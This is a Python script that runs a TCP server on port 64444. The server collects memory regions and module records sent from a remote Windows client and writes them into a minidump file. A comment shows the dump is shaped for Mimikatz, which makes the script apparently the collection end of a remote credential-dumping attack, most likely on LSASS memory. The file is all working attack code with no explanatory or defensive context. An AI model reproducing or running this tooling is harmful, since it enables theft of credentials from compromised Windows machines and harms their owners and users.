#!/usr/bin/env python3

import socket
import sys
import select
import makeminidump

def recvall(sock, size, read_size = 4096):
    data = b""
    while size != 0:
        new_data = sock.recv(size)
        size -= len(new_data)
        data += new_data
    
    return data

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('0.0.0.0', 64444)
print('starting up on %s port %s' % server_address)
sock.bind(server_address)

sock.listen(5)

while True:
    regions = []
    modules = []
    print('waiting for a connection')
    connection, client_address = sock.accept()

    connection.settimeout(10.0)
    print('connection from', client_address)

    data = "\x02\x00\x00\x00\xcc"#\xc3"


    data = recvall(connection, 276)

    dwMajorVersion = int.from_bytes(data[4:7], byteorder='little')
    dwMinorVersion = int.from_bytes(data[8:11], byteorder='little')
    dwBuildNumber = int.from_bytes(data[12:15], byteorder='little')

    print("Major: %d, Minor: %d, Build: %d" % (dwMajorVersion, dwMinorVersion, dwBuildNumber))

    total = 0
    while True:

        try:
            #print(data)

            data = recvall(connection, 16)

            scrape_type = int.from_bytes(data[0:3], byteorder='little')
            size = int.from_bytes(data[4:7], byteorder='little')
            region = int.from_bytes(data[8:15], byteorder='little')

            #print("%016x = %d" % (region, size))        

            if scrape_type == 1: # Memory
                data = recvall(connection, size)
                regions.append((region, data))
            elif scrape_type == 0:
                print("module!")
                data = recvall(connection, 100)
                data = b"\\\x00" + data  # Mimikatz wcsrchr
                clean = data.replace(b"\x00", b"")
                print(clean)
                modules.append((region, size, data))

            #print(data)
            total += len(data)
            #print("RECV'D SO FAR: " + str(total))
        except socket.timeout as e:
            break

    print("Regions: " + str(len(regions)))
    print("Modules: " + str(len(modules)))
    print(modules)
    #connection.sendall(b"\xc3")

    makeminidump.makeminidump("/tmp/minidump", dwMajorVersion, dwMinorVersion, dwBuildNumber, regions, modules)

    print("CLOSING CONNECTION")
    connection.close()
